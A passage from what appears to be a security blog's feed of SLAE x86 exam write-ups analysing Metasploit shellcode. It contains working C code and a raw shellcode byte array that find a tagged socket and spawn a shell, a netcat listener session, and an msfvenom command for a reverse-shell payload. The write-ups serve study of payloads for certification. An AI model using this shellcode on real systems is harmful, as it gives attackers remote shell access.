&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;short&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2560&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2560&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// START block of code of code taken from assignment n.2&lt;/span&gt;

    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;client_socket_fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;sockaddr_in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;client_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;client_socket_fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IPPROTO_TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;client_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin_family&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;inet_aton&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;127.0.0.1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;client_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;htons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4444&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client_socket_fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;sockaddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// END block of code of code taken from assignment n.2&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] Trying to find the correct file descriptor&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2560&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MSG_DONTWAIT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;102&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;106&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;72&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;104&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] Correct file descriptor: %d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] Redirecting error, output, and input&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] Here's your shell:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin//sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;/bin//sh&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;In another window, I set up the &lt;code&gt;netcat&lt;/code&gt; listener:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-nlp&lt;/span&gt; 4444
&lt;span class=&quot;c&quot;&gt;# fjHh&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;I had to send the string before the C program could connect to it.&lt;/p&gt;
&lt;p&gt;Next, compile and run and C program:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# compile&lt;/span&gt;
gcc &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; ./file.c

&lt;span class=&quot;c&quot;&gt;# run&lt;/span&gt;
./a.out 
&lt;span class=&quot;c&quot;&gt;# [+] Trying to find the correct file descriptor&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# [+] Correct file descriptor: 3&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# [+] Redirecting error, output, and input&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;In the other window you should now have a &lt;strong&gt;reverse shell&lt;/strong&gt;. Now that I've tested that it works corrrectly, I had to change it a bit, replacing some of the C code with the shellcode:&lt;/p&gt;
&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;sys/socket.h&amp;gt;
#include &amp;lt;netinet/ip.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; \
&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x31\xdb\x53\x89\xe6\x6a\x40\xb7\x0a\x53\x56\x53\x89\xe1\x86&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xfb\x66\xff\x01\x6a\x66\x58\xcd\x80\x81\x3e\x66\x6a\x48\x68&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x75\xf0\x5f\x89\xfb\x6a\x02\x59\x6a\x3f\x58\xcd\x80\x49\x79&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xf8\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// START block of code of code taken from assignment n.2&lt;/span&gt;

    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;client_socket_fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;sockaddr_in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;client_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;client_socket_fd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IPPROTO_TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;client_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin_family&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;inet_aton&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;127.0.0.1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;client_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;htons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4444&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client_socket_fd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;sockaddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;client_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// END block of code of code taken from assignment n.2&lt;/span&gt;

    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)())&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;ret&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;To compile it:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gcc &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-fno-stack-protector&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-z&lt;/span&gt; execstack file.c
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;It worked as expected, spawning a reverse shell in the other window, where I set up the netcat listener:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rbct@slae:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-nvl&lt;/span&gt; 4444
&lt;span class=&quot;c&quot;&gt;# fjHh&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# Connection from 127.0.0.1 port 4444 [tcp/*] accepted&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# uid=1000(rbct) gid=1000(rbct) groups=1000(rbct),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# rbct&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;exit
&lt;/span&gt;rbct@slae:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;This type of shellcode would be used in cases where you've already set up a connection to a TCP socket, and you have control over it, so you're able to send the data desired, and most importantly the first 4 bytes specified in the shellcode.&lt;/p&gt;
</description>
        <pubDate>Sat, 25 Dec 2021 00:00:00 +0100</pubDate>
        <link>/21/12/25/slae32-assignment-5_3</link>
        <guid isPermaLink="true">/21/12/25/slae32-assignment-5_3</guid>
        
        <category>slae</category>
        
        <category>assembly</category>
        
        <category>nasm</category>
        
        <category>c</category>
        
        <category>exam</category>
        
        <category>shellcode</category>
        
        <category>metasploit</category>
        
        <category>x86</category>
        
        
        <category>blog</category>
        
      </item>
    
      <item>
        <title>SLAE x86 Exam - Assignment #5 Part 2</title>
        <description>&lt;h2 id=&quot;disclaimer&quot;&gt;Disclaimer&lt;/h2&gt;
&lt;p&gt;This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert Certification:&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.pentesteracademy.com/course?id=3&quot;&gt;https://www.pentesteracademy.com/course?id=3&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Student ID: PA-30398&lt;/p&gt;
&lt;h2 id=&quot;foreword&quot;&gt;Foreword&lt;/h2&gt;
&lt;p&gt;The 5th assignment requires you to analyze at least 3 shellcode samples created using Msfpayload (nowadays &lt;code&gt;msfvenom&lt;/code&gt;) for 32-bit Linux systems.&lt;/p&gt;
&lt;p&gt;Programs like &lt;code&gt;gdb&lt;/code&gt;/&lt;code&gt;ndisasm&lt;/code&gt;/&lt;code&gt;libemu&lt;/code&gt; can be used for dissecting the shellcode and performing the analysis.&lt;/p&gt;
&lt;p&gt;I chose the following 4 shellcode samples:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Name&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;linux/x86/adduser&lt;/td&gt;
&lt;td&gt;Create a new user with UID 0&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;linux/x86/shell/reverse_nonx_tcp&lt;/td&gt;
&lt;td&gt;Spawn a command shell (staged). Connect back to the attacker&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;linux/x86/shell_find_tag&lt;/td&gt;
&lt;td&gt;Spawn a shell on an established connection (proxy/nat safe)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;linux/x86/shell_reverse_tcp_ipv6&lt;/td&gt;
&lt;td&gt;Connect back to attacker and spawn a command shell over IPv6&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;In this post I'll analyse &lt;code&gt;linux/x86/shell/reverse_nonx_tcp&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&quot;analysis&quot;&gt;Analysis&lt;/h2&gt;
&lt;h3 id=&quot;ndisasm&quot;&gt;NDISASM&lt;/h3&gt;
&lt;p&gt;To generate the payload:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; linux/x86/shell/reverse_nonx_tcp &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; shellcode.bin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;To analyse it with &lt;code&gt;ndisasm&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ndisasm shellcode.bin &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; 32 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; intel
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;It returns the following output (comments are mine though):&lt;/p&gt;
